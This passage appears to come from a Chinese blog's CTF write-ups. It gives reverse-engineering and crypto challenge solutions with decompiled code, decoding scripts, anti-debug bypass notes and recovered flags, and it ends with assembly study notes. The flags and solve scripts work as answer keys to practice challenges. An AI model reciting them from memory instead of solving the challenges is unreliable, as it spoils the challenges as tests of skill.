view的窗口，Alt+t，搜索flag，就行了。至于为什么这么做，是因为shift+12出来的字符串太多了。也可以直接改文件后缀名为.txt，然后记事本打开搜索flag。</p><p>最后得到flag{hello_world_gogogo}</p><h3 id="35-WUSTCTF2020-level3"><a href="#35-WUSTCTF2020-level3" class="headerlink" title="35.[WUSTCTF2020]level3"></a>35.[WUSTCTF2020]level3</h3><p>这是一道该base表的题。IDA打开<br><img src="https://i.loli.net/2020/12/24/7C6T1SJRyYwxuPr.png"><br>如果直接解的话，会是这个结果wa�f2�4�c�d4_is_p�e_stӲt�of_reverq�|，感觉有一点flag的影子，推测是变表的base编码。然后由于眼瞎找了半天才找到这个位置。<br><img src="https://i.loli.net/2020/12/24/wSiebnE5tok8Tr9.png"><br>开始写脚本</p><pre><code>import base64import stringstr1 = &quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;string1 = &quot;TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))</code></pre><p>得到flag{Base64_is_the_start_of_reverse}</p><h3 id="36-FlareOn6-Overlong"><a href="#36-FlareOn6-Overlong" class="headerlink" title="36.[FlareOn6]Overlong"></a>36.[FlareOn6]Overlong</h3><p>文件下载下来，还有提示，说是flag被以一种方式藏了起来，直接打开，会弹出一个窗口。<br><img src="https://i.loli.net/2020/12/24/cP2B4OVTRyC5ma8.png"></p><p>然后拖到IDA里面，代码很少。<br><img src="https://i.loli.net/2020/12/24/qDuIPERnAbB3Ygd.png"><br>然后通过动调来该那个28，将他改成&amp;unk_402008的长度B7-8。<br><img src="https://i.loli.net/2020/12/24/Nk57GtVsTcb4Z9C.png"><br>然后改1C为AF。<br><img src="https://i.loli.net/2020/12/24/kEH73LARtJ9uQzx.png"><br>得到flag<br><img src="https://i.loli.net/2020/12/24/IoWNlTjsA3BkYUg.png"></p><h3 id="37-WUSTCTF2020-Cr0ssfun"><a href="#37-WUSTCTF2020-Cr0ssfun" class="headerlink" title="37.[WUSTCTF2020]Cr0ssfun"></a>37.[WUSTCTF2020]Cr0ssfun</h3><p>IDA打开<br><img src="https://i.loli.net/2020/12/24/rTmFlns3vNyj6hW.png"><br>然后开始写脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    puts(&quot; _    _ _   _ _____ _____   _____           &quot;);      puts(&quot;| |  | | | | /  ___|_   _| /  ___|          &quot;);      puts(&quot;| |  | | | | \\ `--.  | |   \\ `--.  ___  ___ &quot;);      puts(&quot;| |/\\| | | | |`--. \\ | |    `--. \\/ _ \\/ __|&quot;);      puts(&quot;\\  /\\  / |_| /\\__/ / | |   /\\__/ /  __/ (__ &quot;);      puts(&quot; \\/  \\/ \\___/\\____/  \\_/   \\____/ \\___|\\___|&quot;);      int a1[42];      int i;      printf(&quot;\n&quot;);    a1[10] = 112;    a1[13] = 64;    a1[3] = 102;    a1[26] = 114;    a1[20] = 101;    a1[7] =48;       a1[16] =95;       a1[11] = 112;    a1[23] =101;    a1[30] = 117;    a1[0] = 119;    a1[6] = 50;    a1[22] = 115;    a1[31] = 110;    a1[12] = 95 ;    a1[15] = 100;    a1[8] = 123;    a1[18] = 51;    a1[28] = 95;    a1[21] = 114;    a1[2] = 116;    a1[9] = 99;    a1[32] = 125;    a1[19] = 118;    a1[5] = 48;    a1[14] = 110;    a1[4] = 50;    a1[17] = 114;    a1[29] = 102;    a1[17] = 114;    a1[24] = 95;    a1[1] = 99;    a1[25] = 64;    a1[27] = 101;    for(i=0;i&lt;42;i++)    &#123;        printf(&quot;%c&quot;,a1[i]);    &#125; &#125; </code></pre><p>得到flag{cpp_@nd_r3verse_@re_fun}</p><h3 id="38-ACTF新生赛2020-Oruga"><a href="#38-ACTF新生赛2020-Oruga" class="headerlink" title="38.[ACTF新生赛2020]Oruga"></a>38.[ACTF新生赛2020]Oruga</h3><p>这道题类似于迷宫题，只不过走的方式有些特别。<br><img src="https://i.loli.net/2020/12/24/RecB9yZq1oaXv5O.png"><br>下面来分析如何走的迷宫。<br><img src="https://i.loli.net/2020/12/24/SenlCgwKvuP6TyO.png"><br>得到flag{MEWEMEWJMEWJM}</p><h3 id="39-MRCTF2020-Transform"><a href="#39-MRCTF2020-Transform" class="headerlink" title="39.[MRCTF2020]Transform"></a>39.[MRCTF2020]Transform</h3><p>IDA打开，找到关键代码<br><img src="https://i.loli.net/2020/12/24/df4E7X5C2V63kYh.png"><br>开始写脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[33]=&#123;  103, 121, 123, 127, 117,  43,  60,  82,  83, 121,    87,  94,  93,  66, 123,  45,  42, 102,  66, 126,    76,  87, 121,  65, 107, 126, 101,  60,  92,  69,   111,  98,  77&#125;;      int b[33]=&#123;9,0x0a,0x0f,0x17,7,0x18,0x0c,6,1,0x10,3,0x11,0x20,0x1d,0x0b,0x1e,0x1b,0x16,4,0x0d,0x13,0x14,0x15,2,0x19,5,0x1f,8,0x12,0x1a,0x1c,0x0e,0&#125;;      int flag[33];      int i,j;      for(i=0;i&lt;33;i++)      &#123;          flag[i]=a[i]^b[i];          printf(&quot;%c&quot;,flag[i]);    &#125;    printf(&quot;\n&quot;);    for(i=0;i&lt;33;i++)    &#123;        for(j=0;j&lt;33;j++)        &#123;            if(b[j]==i)            printf(&quot;%c&quot;,flag[j]);        &#125;    &#125; &#125; </code></pre><p>得到flag{Tr4nsp0sltiON_Clph3r_1s_3z}</p><h3 id="40-Java逆向解密"><a href="#40-Java逆向解密" class="headerlink" title="40.Java逆向解密"></a>40.Java逆向解密</h3><p>.class文件，用jd-gui打开，得到代码</p><pre><code>import java.io.PrintStream;import java.util.ArrayList;import java.util.Scanner;public class Reverse&#123;  public static void main(String[] args)  &#123;    Scanner s = new Scanner(System.in);    System.out.println(&quot;Please input the flag ��&quot;);    String str = s.next();    System.out.println(&quot;Your input is ��&quot;);    System.out.println(str);    char[] stringArr = str.toCharArray();    Encrypt(stringArr);  &#125;  public static void Encrypt(char[] arr)  &#123;    ArrayList&lt;Integer&gt; Resultlist = new ArrayList();    for (int i = 0; i &lt; arr.length; i++)    &#123;      int result = arr[i] + &#39;@&#39; ^ 0x20;      Resultlist.add(Integer.valueOf(result));    &#125;    int[] KEY = &#123; 180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65 &#125;;    ArrayList&lt;Integer&gt; KEYList = new ArrayList();    for (int j = 0; j &lt; KEY.length; j++) &#123;      KEYList.add(Integer.valueOf(KEY[j]));    &#125;    System.out.println(&quot;Result:&quot;);    if (Resultlist.equals(KEYList)) &#123;      System.out.println(&quot;Congratulations��&quot;);    &#125; else &#123;      System.err.println(&quot;Error��&quot;);    &#125;  &#125;&#125;</code></pre><p>中间就只有一个result = arr[i] + ‘@’ ^ 0x20;的处理，开始写脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[]=&#123;180,136,137,147,191,137,147,191,148,136,133,191,134,140,129,135,191,65&#125;;    int i;    for(i=0;i&lt;18;i++)    &#123;        a[i]=a[i]-&#39;@&#39;^0x20;        printf(&quot;%c&quot;,a[i]);    &#125;&#125;</code></pre><p>得到flag{This_is_the_flag_!}</p><h3 id="41-crackMe"><a href="#41-crackMe" class="headerlink" title="41.crackMe"></a>41.crackMe</h3><p>IDA打开，找到主函数。</p><pre><code>int wmain()&#123;  FILE *v0; // eax  FILE *v1; // eax  char v3; // [esp+3h] [ebp-405h]  char v4; // [esp+4h] [ebp-404h] BYREF  char v5[255]; // [esp+5h] [ebp-403h] BYREF  char Format; // [esp+104h] [ebp-304h] BYREF  char v7[255]; // [esp+105h] [ebp-303h] BYREF  char v8; // [esp+204h] [ebp-204h] BYREF  char v9[255]; // [esp+205h] [ebp-203h] BYREF  char v10; // [esp+304h] [ebp-104h] BYREF  char v11[255]; // [esp+305h] [ebp-103h] BYREF  printf(&quot;Come one! Crack Me~~~\n&quot;);  v10 = 0;  memset(v11, 0, sizeof(v11));  v8 = 0;  memset(v9, 0, sizeof(v9));  while ( 1 )  &#123;    do    &#123;      do      &#123;        printf(&quot;user(6-16 letters or numbers):&quot;);        scanf(&quot;%s&quot;, &amp;v10);  //这里是输入的用户名        v0 = (FILE *)sub_4024BE();        fflush(v0);      &#125;      while ( !(unsigned __int8)sub_401000(&amp;v10) );      printf(&quot;password(6-16 letters or numbers):&quot;);      scanf(&quot;%s&quot;, &amp;v8);  //输入的密码，注意这里输入的是字符。      v1 = (FILE *)sub_4024BE();      fflush(v1);    &#125;    while ( !(unsigned __int8)sub_401000(&amp;v8) );    sub_401090(&amp;v10); //对用户名进行了一个操作，这个函数没有什么用。    Format = 0;    memset(v7, 0, sizeof(v7));    v4 = 0;    memset(v5, 0, sizeof(v5));    v3 = ((int (__cdecl *)(char *, char *))loc_4011A0)(&amp;Format, &amp;v4);  //这里要去花，最后得到Format=congratulation   v4=Please try again    if ( sub_401830((int)&amp;v10, &amp;v8) )//这里是关于用户名和密码的一个函数    &#123;      if ( v3 )//v3肯定会等于1。        break;    &#125;    printf(&amp;v4);  &#125;  printf(&amp;Format);  return 0;&#125;</code></pre><p>分析sub_401830函数。</p><pre><code>// v7----v15----v17，大概加密过程bool __usercall sub_401830@&lt;al&gt;(int ebx0@&lt;ebx&gt;, int a1, const char *a2)&#123;  int v4; // [esp+18h] [ebp-22Ch]  signed int v5; // [esp+1Ch] [ebp-228h]  signed int v6; // [esp+28h] [ebp-21Ch]  unsigned int v7; // [esp+30h] [ebp-214h]  char v8; // [esp+36h] [ebp-20Eh]  char v9; // [esp+37h] [ebp-20Dh]  char v10; // [esp+38h] [ebp-20Ch]  unsigned __int8 v11; // [esp+39h] [ebp-20Bh]  unsigned __int8 v12; // [esp+3Ah] [ebp-20Ah]  char v13; // [esp+3Bh] [ebp-209h]  int v14; // [esp+3Ch] [ebp-208h]  char v15; // [esp+40h] [ebp-204h]  char v16; // [esp+41h] [ebp-203h]  char v17; // [esp+140h] [ebp-104h]  char v18; // [esp+141h] [ebp-103h]  v5 = 0;  v6 = 0;  v12 = 0;  v11 = 0;  v17 = 0;  memset(&amp;v18, 0, 0xFFu);  v15 = 0;  memset(&amp;v16, 0, 0xFFu);  v10 = 0;  v7 = 0;  v4 = 0;  while ( v7 &lt; strlen(a2) )  &#123;    if ( isdigit(a2[v7]) )                      // 是不是10进制，若参数c为阿拉伯数字0~9，则返回非0值，否则返回0    &#123;      v9 = a2[v7] - 48;//将输入的0~9字符，换为十进制的0~9    &#125;    else if ( isxdigit(a2[v7]) )                // 是不是16进制0123456789abcdefABCDEF，是就返回非0    &#123;      if ( *(_DWORD *)(*(_DWORD *)(__readfsdword(0x30u) + 24) + 12) != 2 )        a2[v7] = 34;      v9 = (a2[v7] | 0x20) - 87;//将输入的abcdefABCDEF，转换为十进制的10~15。    &#125;    else    &#123;      v9 = ((a2[v7] | 0x20) - 97) % 6 + 10;    &#125;    v10 = v9 + 16 * v10;    if ( !((signed int)(v7 + 1) % 2) )          // 如果a[v7]中的v7是奇数就进入，这个的作用差不多就是，将输入的2个值，然后变成0~15的两个值，再通过v10 = v9 + 16 * v10;，就变成了一个值，给了*v15。例如1，a结果变换后就会变成一个值&#39;1a&#39;=26    &#123;      *(&amp;v15 + v4++) = v10;      ebx0 = v4;      v10 = 0;    &#125;    ++v7;  &#125;  while ( v6 &lt; 8 )//实际上从这里可以推测出密码长度为16。  &#123;    v11 += byte_416050[++v12];    v13 = byte_416050[v12];    v8 = byte_416050[v11];    byte_416050[v11] = v13;    byte_416050[v12] = v8;    if ( *(_DWORD *)(__readfsdword(0x30u) + 104) &amp; 0x70 )// 反调试，调试时if判断改为jmp。      v13 = v11 + v12;    *(&amp;v17 + v6) = byte_416050[(unsigned __int8)(v8 + v13)] ^ *(&amp;v15 + v5);//通过这个来得到v15，但是byte_416050[(unsigned __int8)(v8 + v13)]需要动调来获得。    if ( *(_DWORD *)(__readfsdword(0x30u) + 2) &amp; 0xFF )// 反调试，调试时if判断改为jmp。    &#123;      v11 = -83;      v12 = 43;    &#125;    sub_401710((int)&amp;v17, (const char *)a1, v6++);    v5 = v6;    if ( v6 &gt;= (unsigned int)(&amp;v15 + strlen(&amp;v15) + 1 - &amp;v16) )      v5 = 0;  &#125;  v14 = 0;  sub_401470(ebx0, &amp;v17, &amp;v14);     // 要让v14!=0，所以if里面的条件都要满足，只不过要注意里面有一个a1[5]是反调试， 得到v17=dbappsec  return v14 == 0xAB94;&#125;</code></pre><p>现在已经知道了v17，现在通过动调来获得byte_416050[(unsigned __int8)(v8 + v13)]，从而得到，&amp;15。<br><img src="https://i.loli.net/2020/12/26/mELNeYIar94kPJG.png"><br>图片中有个错误，应该是记录ecx的值</p><p>开始写脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[8]=&#123;0x2a,0xd7,0x92,0xe9,0x53,0xe2,0xc4,0xcd&#125;;//动调得到的byte_416050[(unsigned __int8)(v8 + v13)]，也就是ecx。    int b[8]=&#123;&#39;d&#39;, &#39;b&#39;, &#39;a&#39;, &#39;p&#39;, &#39;p&#39;, &#39;s&#39;, &#39;e&#39;, &#39;c&#39;&#125;;    int c[8];    int d[16];    int i,j,m,n;    for(i=0;i&lt;8;i++)    &#123;        c[i]=b[i]^a[i];        printf(&quot;%d &quot;,c[i]);    &#125;    for(i=0,j=0;i&lt;8;i++,j+=2)    &#123;        m=c[i]/16;        n=c[i]%16;        d[j]=m;        d[j+1]=n;    &#125;    for(j=0;j&lt;16;j++)    &#123;        if(d[j]&lt;10)        printf(&quot;%d&quot;,d[j]);        else        printf(&quot;%c&quot;,d[j]+87);    &#125;&#125; </code></pre><p>得到4eb5f3992391a1ae，再进行MD5加密得到flag{d2be2981b84f2a905669995873d6a36c}</p><h3 id="42-刮开有奖"><a href="#42-刮开有奖" class="headerlink" title="42.刮开有奖"></a>42.刮开有奖</h3><pre><code>INT_PTR __stdcall DialogFunc(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)&#123;  const char *v4; // esi  const char *v5; // edi  int v7[2]; // [esp+8h] [ebp-20030h] BYREF  int v8; // [esp+10h] [ebp-20028h]  int v9; // [esp+14h] [ebp-20024h]  int v10; // [esp+18h] [ebp-20020h]  int v11; // [esp+1Ch] [ebp-2001Ch]  int v12; // [esp+20h] [ebp-20018h]  int v13; // [esp+24h] [ebp-20014h]  int v14; // [esp+28h] [ebp-20010h]  int v15; // [esp+2Ch] [ebp-2000Ch]  int v16; // [esp+30h] [ebp-20008h]  CHAR String[65536]; // [esp+34h] [ebp-20004h] BYREF  char v18[65536]; // [esp+10034h] [ebp-10004h] BYREF  if ( a2 == 272 )    return 1;  if ( a2 != 273 )    return 0;  if ( (_WORD)a3 == 1001 )  &#123;    memset(String, 0, 0xFFFFu);    GetDlgItemTextA(hDlg, 1000, String, 0xFFFF);//这里的string是flag。    if ( strlen(String) == 8 )    &#123;      v7[0] = 90;      v7[1] = 74;      v8 = 83;      v9 = 69;      v10 = 67;      v11 = 97;      v12 = 78;      v13 = 72;      v14 = 51;      v15 = 110;      v16 = 103;//上面10个数都是v7[]      sub_4010F0(v7, 0, 10);//对v7[]进行了处理。      memset(v18, 0, 0xFFFFu);      v18[0] = String[5];      v18[2] = String[7];      v18[1] = String[6];      v4 = (const char *)sub_401000(v18, strlen(v18));//sub_401000是长得比较丑的base64编码。对String[5]，String[6]，String[7]3个字母编码，得到了v4。      memset(v18, 0, 0xFFFFu);      v18[1] = String[3];      v18[0] = String[2];      v18[2] = String[4];      v5 = (const char *)sub_401000(v18, strlen(v18));对String[2]，String[3]，String[4]3个字母编码，得到了v5。      if ( String[0] == v7[0] + 34//得到sting[0]        &amp;&amp; String[1] == v10//得到sting[1]        &amp;&amp; 4 * String[2] - 141 == 3 * v8        &amp;&amp; String[3] / 4 == 2 * (v13 / 9)        &amp;&amp; !strcmp(v4, &quot;ak1w&quot;)//通过这个来得到String[5]，String[6]，String[7]。&#39;jMp&#39;        &amp;&amp; !strcmp(v5, &quot;V1Ax&quot;) )//通过这个来得到，String[2]，String[3]，String[4]。&#39;WP1&#39;      &#123;        MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0);      &#125;    &#125;    return 0;  &#125;  if ( (_WORD)a3 != 1 &amp;&amp; (_WORD)a3 != 2 )    return 0;  EndDialog(hDlg, (unsigned __int16)a3);  return 1;&#125;</code></pre><p>现在看sub_4010F0对v7[]进行了什么操作</p><pre><code>int __cdecl sub_4010F0(int a1, int a2, int a3)&#123;  int result; // eax  int i; // esi  int v5; // ecx  int v6; // edx  result = a3;  for ( i = a2; i &lt;= a3; a2 = i )  &#123;    v5 = 4 * i;    v6 = *(_DWORD *)(4 * i + a1);    if ( a2 &lt; result &amp;&amp; i &lt; result )    &#123;      do      &#123;        if ( v6 &gt; *(_DWORD *)(a1 + 4 * result) )        &#123;          if ( i &gt;= result )            break;          ++i;          *(_DWORD *)(v5 + a1) = *(_DWORD *)(a1 + 4 * result);          if ( i &gt;= result )            break;          while ( *(_DWORD *)(a1 + 4 * i) &lt;= v6 )          &#123;            if ( ++i &gt;= result )              goto LABEL_13;          &#125;          if ( i &gt;= result )            break;          v5 = 4 * i;          *(_DWORD *)(a1 + 4 * result) = *(_DWORD *)(4 * i + a1);        &#125;        --result;      &#125;      while ( i &lt; result );    &#125;LABEL_13:    *(_DWORD *)(a1 + 4 * result) = v6;    sub_4010F0(a1, a2, i - 1);//这里还有个递归    result = a3;    ++i;  &#125;  return result;&#125;</code></pre><p>由于所有值都知道，所以可以直接复制下来，得到改变后的v7[]。需要注意的是，里面出现的(_DWORD *)都删了，特别是4 *也要删除，原因是这些变量都是int型(占了4个字节)，而这部分在IDA里面看汇编代码<br><img src="https://i.loli.net/2020/12/26/K4ebXYPm32pUu8F.png"><br>开始写脚本得到v7[]</p><pre><code>#include&lt;stdio.h&gt;int fun(int *a1,int a2,int a3)&#123;    int result; // eax  int i; // esi  int v5; // ecx  int v6; // edx  result = a3;  for ( i = a2; i &lt;= a3; a2 = i )  &#123;    v5 =i;    v6 = *( i + a1);    if ( a2 &lt; result &amp;&amp; i &lt; result )    &#123;      do      &#123;        if ( v6 &gt; *(a1 + result) )         &#123;          if ( i &gt;= result )            break;          ++i;          *(v5 + a1) = *(a1 +result);          if ( i &gt;= result )            break;          while ( *(a1 + i) &lt;= v6 )          &#123;            if ( ++i &gt;= result )              goto LABEL_13;          &#125;          if ( i &gt;= result )            break;          v5 = i;          *(a1 + result) = *(i + a1);        &#125;        --result;      &#125;      while ( i &lt; result );    &#125;LABEL_13:    *(a1 +result) = v6;    fun(a1, a2, i - 1);    result = a3;    ++i;  &#125;  return result;&#125;int main(void)&#123;    int v7[11]=&#123;90,74,83,69,67,97,78,72,51,110,103&#125;;    int i;    fun(v7,0,10);    for(i=0;i&lt;11;i++)    &#123;        printf(&quot;%d &quot;,v7[i]);     &#125; &#125; </code></pre><p>得到v7=51 67 69 72 74 78 83 90 97 103 110;从而得到string[0]=’U’，string[1]=’J’</p><p>得到flag{UJjMpWP1}</p><h3 id="43-ACTF新生赛2020-rome"><a href="#43-ACTF新生赛2020-rome" class="headerlink" title="43.[ACTF新生赛2020]rome"></a>43.[ACTF新生赛2020]rome</h3><p>脚本</p><pre><code>code=list(&#39;Qsw3sj_lz4_Ujw@l&#39;)flag=&#39;&#39;i=0while(i&lt;=15):    for k in range(0,127):        z=k        if(64 &lt; k &lt;= 90):            k = (k - 51) % 26 + 65        if(96&lt;k&lt;=122):            k = (k - 79) % 26 + 97        if(chr(k)==code[i]):            flag += chr(z)    i=i+1print(flag)</code></pre><h2 id="Crypto方向"><a href="#Crypto方向" class="headerlink" title="Crypto方向"></a>Crypto方向</h2><h3 id="1-BJDCTF2020-这是base"><a href="#1-BJDCTF2020-这是base" class="headerlink" title="1.[BJDCTF2020]这是base??"></a>1.[BJDCTF2020]这是base??</h3><p>下载下来得到一个txt文件，发现是一个换表的base64编码的密文。写出脚本如下</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;malloc.h&gt; int main(void)&#123;    char str1[100]=&quot;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&quot;;    char str2[100];    int table[]=&#123;0,0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,62,0,0,0,             63,42,43,44,45,46,47,48,             19,20,21,0,0,0,0,0,0,0,11,             12,13,14,15,16,17,18,24,0,1,2,3,             4,5,22,23,49,50,51,8,9,             38,39,40,41,0,0,0,0,0,0,25,             26,27,28,29,30,31,32,33,34,             35,36,37,52,53,54,55,56,57,             58,59,60,61,6,7,10           &#125;;     int len1;    int len2;    int i,j;     len1=strlen(str1);    if(strstr(str1,&quot;==&quot;))    &#123;        len2=(len1/4)*3-2;    &#125;       else if(strstr(str1,&quot;=&quot;))    &#123;        len2=(len1/4)*3-1;    &#125;    else    &#123;        len2=(len1/4)*3;    &#125;    for(i=0,j=0;i&lt;len1-2;i+=4,j+=3)    &#123;        str2[j]=((table[str1[i]])&lt;&lt;2)|((table[str1[i+1]])&gt;&gt;4);        str2[j+1]=(table[str1[i+1]]&lt;&lt;4)|((table[str1[i+2]])&gt;&gt;2);        str2[j+2]=((table[str1[i+2]])&lt;&lt;6)|(table[str1[i+3]]);    &#125;//  printf(&quot;%d&quot;,len2);     for(i=0;i&lt;len2;i++)    &#123;        printf(&quot;%c&quot;,str2[i]);    &#125;    return 0; &#125; </code></pre><p>得到flag{D0_Y0u_kNoW_Th1s_b4se_map}</p><p>网上找的Python脚本如下</p><pre><code>import base64dict=&#123;0: &#39;J&#39;, 1: &#39;K&#39;, 2: &#39;L&#39;, 3: &#39;M&#39;, 4: &#39;N&#39;, 5: &#39;O&#39;, 6: &#39;x&#39;, 7: &#39;y&#39;, 8: &#39;U&#39;, 9: &#39;V&#39;, 10: &#39;z&#39;, 11: &#39;A&#39;, 12: &#39;B&#39;, 13: &#39;C&#39;, 14: &#39;D&#39;, 15: &#39;E&#39;, 16: &#39;F&#39;, 17: &#39;G&#39;, 18: &#39;H&#39;, 19: &#39;7&#39;, 20: &#39;8&#39;, 21: &#39;9&#39;, 22: &#39;P&#39;, 23: &#39;Q&#39;, 24: &#39;I&#39;, 25: &#39;a&#39;, 26: &#39;b&#39;, 27: &#39;c&#39;, 28: &#39;d&#39;, 29: &#39;e&#39;, 30: &#39;f&#39;, 31: &#39;g&#39;, 32: &#39;h&#39;,33: &#39;i&#39;, 34: &#39;j&#39;, 35: &#39;k&#39;, 36: &#39;l&#39;, 37: &#39;m&#39;, 38: &#39;W&#39;, 39: &#39;X&#39;, 40: &#39;Y&#39;, 41: &#39;Z&#39;, 42: &#39;0&#39;, 43: &#39;1&#39;, 44: &#39;2&#39;, 45: &#39;3&#39;, 46: &#39;4&#39;, 47: &#39;5&#39;, 48: &#39;6&#39;, 49: &#39;R&#39;, 50: &#39;S&#39;, 51: &#39;T&#39;, 52: &#39;n&#39;, 53: &#39;o&#39;, 54: &#39;p&#39;, 55: &#39;q&#39;, 56: &#39;r&#39;, 57: &#39;s&#39;, 58: &#39;t&#39;, 59: &#39;u&#39;, 60: &#39;v&#39;, 61: &#39;w&#39;, 62: &#39;+&#39;, 63: &#39;/&#39;, 64: &#39;=&#39;&#125;base64_list = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;,&#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;,&#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;,&#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;+&#39;, &#39;/&#39;]cipher=&#39;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#39;res=&#39;&#39;for i in range(len(cipher)):    for j in range(64):        if(dict[j]==cipher[i]):            res+=base64_list[j]flag=base64.b64decode(res)print(flag)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习汇编的一些记录</title>
      <link href="2020/11/30/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/"/>
      <url>2020/11/30/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="学习汇编的一些记录"><a href="#学习汇编的一些记录" class="headerlink" title="学习汇编的一些记录"></a>学习汇编的一些记录</h1><h2 id="一、一些常用汇编指令"><a href="#一、一些常用汇编指令" class="headerlink" title="一、一些常用汇编指令"></a>一、一些常用汇编指令</h2><h3 id="汇编指令（书上比较重要的）"><a href="#汇编指令（书上比较重要的）" class="headerlink" title="汇编指令（书上比较重要的）"></a>汇编指令（书上比较重要的）</h3><p>jmp word ptr 内存单元地址（段内转移）</p><pre><code>功能：从内存单元地址处开始存放一个字，是转会目的地的偏移地址。（实际上要去IP）</code></pre><p>jmp dword ptr</p><pre><code>功能：内存单元地址处开始存放着两个字，高地址处的字是转移地址的目的段地址，低地址处是转移的目的偏移地址</code></pre><p>ret</p><pre><code>pop IP</code></pre><p>retf</p><pre><code>pop IPpop CS</code></pre><p>call</p><pre><code>push IP//将call指令下一句的IP入栈，在call内部会有个ret将IP又出栈，从而返回到call指令下一句。jmp near ptr 标号</code></pre><p>更多细节，和例子还是在书上看。</p><h3 id="汇编指令（书上没有的）"><a href="#汇编指令（书上没有的）" class="headerlink" title="汇编指令（书上没有的）"></a>汇编指令（书上没有的）</h3><p>var_4 = dword ptr -4</p><pre><code>var_4 = dword ptr -4；   这是解释代码，可解释成var_4 是 esp - 4处的空间;var_0 = dword ptr 8;    var_0 是 esp +8处的空间；在IDA中VAR 是代表的函数中的局部变量.你要知道在汇编中访问局部变量，是通过ebp-x的来定位栈中位置.var a = dwod -10hvar b = dwod - 8hvar c = dwod - 4h_main proc neapush ebpmov ebp,espsub esp,10hmov [ebp-4],0   //同过这种方式访问局部变量，等价于mov [ebp+c],0那么我把var c 换个有意思的名字如 var Max = dword - 4hmov [ebp+Max],0   //这个时候，就更清楚了。</code></pre><p>lea</p><pre><code>LEA 取有效地址指令 （Load Effective Address )　　指令格式：LEA 目的，源　　指令功能：取源操作数地址的偏移量，并把它传送到目的操作数所在的单元。　　LEA 指令要求原操作数必须是 存储单元 ，而且目的操作数必须是一个除段寄存器之外的16位或32位寄存器。当目的操作数是16位通用寄存器时，那么只装入有效地址的低16位。使用时要注意它与MOV指令的区别，MOV指令传送的一般是源操作数中的内容而不是地址。　　例1 假设：SI=1000H , DS=5000H, (51000H)=1234H　　执行指令 LEA BX , [SI]后，BX=1000H　　执行指令 MOV BX , [SI]后，BX=1234H　　有时，LEA指令也可用取偏移地址的MOV指令替代。　　例2 下面两条指令就是等价的，他们都取TABLE的偏移地址，然后送到BX中，即　　LEA BX,TABLE　　MOV BX,OFFSET TABLE</code></pre><p>MOVZX指令</p><pre><code>汇编语言数据传送指令MOV的变体。无符号扩展，并传送。movzx是将源操作数的内容拷贝到目的操作数，并将该值0扩展至16位或者32位。但是它只适用于无符号整数。 他大致下面的三种格式。　　movzx 32位通用寄存器, 8位通用寄存器/内存单元　　movzx 32位通用寄存器, 16位通用寄存器/内存单元　　movzx 16位通用寄存器, 8位通用寄存器/内存单元　　举个例子。例如　　令eax=00304000h　　若执行 movzx eax, ax后 eax = 00004000h 。　　若执行 movzx eax, ah后 eax = 00000040h。　　又如：　　MOV BL,80H　　MOVZX AX,BL　　运行完以上汇编语句之后，AX的值为0080H。由于BL为80H，最高位也即符号位为1，但在进行无符号扩展时，其扩展的高8位均为0，故赋值AX为0080H。　　总结:　　movzx其实就是将我们的源操作数取出来,然后置于目的操作数,目的操作数其余位用0填充。</code></pre><p>text指令</p><pre><code>test 对两个参数(目标，源)执行AND逻辑操作,并根据结果设置标志寄存器,结果本身不会保存。test eax ，eax 不改变值的大小，只改变标志位ZF。运算结果为0，则zf=1 ，否则zf=0所有的对操作数进行算术和逻辑运算的指令，都会根据运算结果修改ZF标志。</code></pre><p>jnz指令</p><pre><code>JNZ : jump if not zero 结果不为零则转移</code></pre><p>cmd</p><pre><code> cmp(compare)指令进行比较两个操作数的大小 例:cmp oprd1,oprd2 